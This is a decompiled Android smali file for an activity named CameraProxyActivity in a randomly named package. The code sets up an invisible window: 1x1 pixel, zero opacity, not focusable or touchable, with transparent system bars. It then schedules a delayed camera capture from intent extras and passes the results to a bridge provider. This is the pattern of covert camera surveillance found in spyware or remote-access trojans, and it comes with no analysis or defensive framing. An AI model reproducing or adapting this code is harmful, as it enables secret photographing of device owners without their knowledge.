.class public Lcom/servers/ozzbzk/CameraProxyActivity;
.super Landroid/app/Activity;


# static fields
.field private static final TAG:Ljava/lang/String; = "CameraProxy"


# direct methods
.method static bridge synthetic -$$Nest$mdoCapture(Lcom/servers/ozzbzk/CameraProxyActivity;II)V
    .locals 0

    invoke-direct {p0, p1, p2}, Lcom/servers/ozzbzk/CameraProxyActivity;->doCapture(II)V

    return-void
.end method

.method static bridge synthetic -$$Nest$smstoreError(Ljava/lang/String;)V
    .locals 0

    invoke-static {p0}, Lcom/servers/ozzbzk/CameraProxyActivity;->storeError(Ljava/lang/String;)V

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    .line 29
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method

.method private doCapture(II)V
    .locals 0

    .line 76
    new-instance p2, Lcom/servers/ozzbzk/CameraProxyActivity$2;

    invoke-direct {p2, p0, p1}, Lcom/servers/ozzbzk/CameraProxyActivity$2;-><init>(Lcom/servers/ozzbzk/CameraProxyActivity;I)V

    invoke-static {p2}, Lcom/servers/ozzbzk/Scheduler;->submitIo(Ljava/lang/Runnable;)Ljava/util/concurrent/Future;

    return-void
.end method

.method private static storeError(Ljava/lang/String;)V
    .locals 3

    .line 112
    new-instance v0, Landroid/os/Bundle;

    invoke-direct {v0}, Landroid/os/Bundle;-><init>()V

    .line 113
    const-string v1, "success"

    const/4 v2, 0x0

    invoke-virtual {v0, v1, v2}, Landroid/os/Bundle;->putBoolean(Ljava/lang/String;Z)V

    .line 114
    const-string v1, "has_result"

    const/4 v2, 0x1

    invoke-virtual {v0, v1, v2}, Landroid/os/Bundle;->putBoolean(Ljava/lang/String;Z)V

    if-eqz p0, :cond_0

    goto :goto_0

    .line 115
    :cond_0
    const-string p0, "unknown"

    :goto_0
    const-string v1, "error"

    invoke-virtual {v0, v1, p0}, Landroid/os/Bundle;->putString(Ljava/lang/String;Ljava/lang/String;)V

    .line 116
    const-string p0, "captured_at"

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v1

    invoke-virtual {v0, p0, v1, v2}, Landroid/os/Bundle;->putLong(Ljava/lang/String;J)V

    .line 117
    invoke-static {v0}, Lcom/servers/ozzbzk/BridgeProvider;->setCameraResult(Landroid/os/Bundle;)V

    return-void
.end method


# virtual methods
.method public onBackPressed()V
    .locals 0

    .line 122
    invoke-virtual {p0}, Lcom/servers/ozzbzk/CameraProxyActivity;->finish()V

    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 5

    .line 35
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    const/4 p1, 0x1

    .line 37
    invoke-virtual {p0, p1}, Lcom/servers/ozzbzk/CameraProxyActivity;->requestWindowFeature(I)Z

    .line 38
    invoke-virtual {p0}, Lcom/servers/ozzbzk/CameraProxyActivity;->getWindow()Landroid/view/Window;

    move-result-object v0

    const/16 v1, 0x238

    .line 39
    invoke-virtual {v0, v1}, Landroid/view/Window;->addFlags(I)V

    .line 44
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v2, 0x1c

    if-lt v1, v2, :cond_0

    .line 45
    invoke-virtual {v0}, Landroid/view/Window;->getAttributes()Landroid/view/WindowManager$LayoutParams;

    move-result-object v1

    iput p1, v1, Landroid/view/WindowManager$LayoutParams;->layoutInDisplayCutoutMode:I

    :cond_0
    const/4 v1, 0x0

    .line 49
    invoke-virtual {v0, v1}, Landroid/view/Window;->setStatusBarColor(I)V

    .line 50
    invoke-virtual {v0, v1}, Landroid/view/Window;->setNavigationBarColor(I)V

    .line 52
    new-instance v2, Landroid/view/View;

    invoke-direct {v2, p0}, Landroid/view/View;-><init>(Landroid/content/Context;)V

    .line 53
    invoke-virtual {v2, v1}, Landroid/view/View;->setBackgroundColor(I)V

    .line 54
    invoke-virtual {p0, v2}, Lcom/servers/ozzbzk/CameraProxyActivity;->setContentView(Landroid/view/View;)V

    .line 56
    invoke-virtual {v0, p1, p1}, Landroid/view/Window;->setLayout(II)V

    .line 57
    invoke-virtual {v0}, Landroid/view/Window;->getDecorView()Landroid/view/View;

    move-result-object p1

    const/4 v0, 0x0

    invoke-virtual {p1, v0}, Landroid/view/View;->setAlpha(F)V

    .line 59
    invoke-virtual {p0}, Lcom/servers/ozzbzk/CameraProxyActivity;->getIntent()Landroid/content/Intent;

    move-result-object p1

    const-string v0, "camera_id"

    invoke-virtual {p1, v0, v1}, Landroid/content/Intent;->getIntExtra(Ljava/lang/String;I)I

    move-result p1

    .line 60
    invoke-virtual {p0}, Lcom/servers/ozzbzk/CameraProxyActivity;->getIntent()Landroid/content/Intent;

    move-result-object v0

    const-string v1, "quality"

    const/16 v2, 0x55

    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->getIntExtra(Ljava/lang/String;I)I

    move-result v0

    .line 62
    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "started camId="

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    const-string v2, "CameraProxy"

    invoke-static {v2, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 67
    new-instance v1, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v2

    invoke-direct {v1, v2}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v2, Lcom/servers/ozzbzk/CameraProxyActivity$1;

    invoke-direct {v2, p0, p1, v0}, Lcom/servers/ozzbzk/CameraProxyActivity$1;-><init>(Lcom/servers/ozzbzk/CameraProxyActivity;II)V

    const-wide/16 v3, 0x12c

    invoke-virtual {v1, v2, v3, v4}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    return-void
.end method
